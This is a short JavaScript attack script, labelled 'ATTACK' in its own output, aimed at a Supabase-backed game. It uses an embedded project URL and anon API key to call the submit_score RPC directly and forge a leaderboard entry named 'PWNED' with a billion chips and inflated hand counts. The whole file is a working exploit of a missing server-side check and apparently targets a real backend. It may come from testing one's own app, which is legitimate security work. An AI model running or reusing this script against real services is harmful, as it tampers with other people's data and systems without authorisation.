const URL='https://gxrpunvhjcrzqnitbqah.supabase.co';
const ANON='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imd4cnB1bnZoamNyenFuaXRicWFoIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzMzNTc5OTksImV4cCI6MjA4ODkzMzk5OX0.MLHYIbU4saCHq0eQbwUzyfAl_q9TLgepKf8iNDDav-Q';
const rpc=async(n,a)=>{const r=await fetch(`${URL}/rest/v1/rpc/${n}`,{method:'POST',headers:{apikey:ANON,Authorization:`Bearer ${ANON}`,'Content-Type':'application/json'},body:JSON.stringify(a)});return {s:r.status,b:(await r.text()).slice(0,160)};};
console.log('ATTACK: submit_score, ONE call, brand-new device, a BILLION chips\n');
console.log('  ', (await rpc('submit_score',{p_device_id:'RT-BILLION',p_player_name:'PWNED',p_total_chips:1000000000,p_hands_played:9999,p_hands_won:9999,p_biggest_win:999999})).b);
